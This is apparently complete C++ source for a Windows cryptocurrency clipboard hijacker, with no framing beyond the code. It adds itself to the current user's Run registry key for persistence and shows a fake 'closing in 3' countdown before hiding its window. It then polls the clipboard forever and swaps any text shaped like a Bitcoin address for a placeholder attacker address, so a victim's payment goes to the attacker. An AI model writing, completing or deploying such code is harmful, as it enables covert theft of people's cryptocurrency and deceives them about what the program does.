#include <iostream>
#include <Windows.h>
#include <string>
#include <ShlObj.h>

bool addToRegistry = true;

bool IsClipboardContainingText()
{
    if (!OpenClipboard(NULL))
        return false;

    bool isTextAvailable = IsClipboardFormatAvailable(CF_TEXT) || IsClipboardFormatAvailable(CF_UNICODETEXT);
    CloseClipboard();

    return isTextAvailable;
}

std::string GetClipboardText()
{
    std::string text;

    if (!OpenClipboard(NULL))
        return text;

    HANDLE clipboardData = GetClipboardData(CF_TEXT);
    if (clipboardData != NULL)
    {
        char* clipboardText = static_cast<char*>(GlobalLock(clipboardData));
        if (clipboardText != NULL)
        {
            text = clipboardText;
            GlobalUnlock(clipboardData);
        }
    }

    CloseClipboard();

    return text;
}

void SetClipboardText(const std::string& text)
{
    if (!OpenClipboard(NULL))
        return;

    EmptyClipboard();

    HGLOBAL clipboardData = GlobalAlloc(GMEM_MOVEABLE, text.length() + 1);
    if (clipboardData != NULL)
    {
        char* clipboardText = static_cast<char*>(GlobalLock(clipboardData));
        if (clipboardText != NULL)
        {
            strcpy_s(clipboardText, text.length() + 1, text.c_str());
            GlobalUnlock(clipboardData);
            SetClipboardData(CF_TEXT, clipboardData);
        }
    }

    CloseClipboard();
}

bool IsMatchedPattern(const std::string& text)
{
    return (text.length() >= 26 && text.length() <= 35) &&
        (text[0] == '1' || text[0] == '3');
}

int main()
{
    if (addToRegistry == true) {
        TCHAR szPath[MAX_PATH];
        GetModuleFileName(NULL, szPath, MAX_PATH);

        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            if (RegSetValueEx(hKey, L"Initialized", 0, REG_SZ, (LPBYTE)szPath, (lstrlen(szPath) + 1) * sizeof(TCHAR)) == ERROR_SUCCESS) {
                std::cout << "Initialized!" << std::endl;
            }
            else {
                std::cerr << "Setupped!" << std::endl;
                return 1;
            }

            RegCloseKey(hKey);
        }
        else {
            std::cerr << "Fatal Error." << std::endl;
            return 1;
        }
    }
   

    HWND window = GetConsoleWindow();
    AllocConsole();


    ShowWindow(window, SW_SHOW);
    std::cout << "Operation complete, closing in 3.\n";
    Sleep(1000);
    std::cout << "Operation complete, closing in 2.\n";
    Sleep(1000);
    std::cout << "Operation complete, closing in 1.\n";
    Sleep(1000);
    std::cout << "Operation complete, closing in 0.\n";
    ShowWindow(window, SW_HIDE);

    std::string previousClipboardText;

    while (true)
    {
        if (IsClipboardContainingText())
        {
            std::string currentClipboardText = GetClipboardText();

            if (currentClipboardText != previousClipboardText && IsMatchedPattern(currentClipboardText))
            {

                SetClipboardText("Your bitcoin address.");
            }

            previousClipboardText = currentClipboardText;
        }
    }

    return 0;
}
